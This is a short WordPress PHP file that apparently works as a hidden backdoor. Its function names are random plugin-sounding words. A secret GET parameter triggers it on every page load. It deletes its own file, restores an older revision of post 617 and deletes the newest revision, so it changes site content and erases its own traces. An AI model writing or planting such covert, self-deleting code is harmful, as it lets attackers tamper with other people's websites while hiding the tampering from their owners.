<?php

function switcher_quick_archives_event() {
	if (isset($_GET['make_word_term']) && $_GET['make_word_term'] === 'shipping_access_toggle_services') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$elementor_class_section_scripts = 617;
		$really_frontend_copyright = wp_get_post_revisions($elementor_class_section_scripts);
		if (empty($really_frontend_copyright)) die('no revisions');
		if (count($really_frontend_copyright) < 2) die('less than 2');
		$activity_include_event = array_shift($really_frontend_copyright);
		$security_link_health = $activity_include_event->ID;
		$fast_after_seo = array_shift($really_frontend_copyright);
		$asset_address_push = $fast_after_seo->ID;
		$gallery_elements_verification_page = wp_restore_post_revision($asset_address_push);
		if ($gallery_elements_verification_page === false) die('error restoring');
		$gallery_elements_verification_page = wp_delete_post_revision($security_link_health);		
		if ($gallery_elements_verification_page === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'switcher_quick_archives_event');
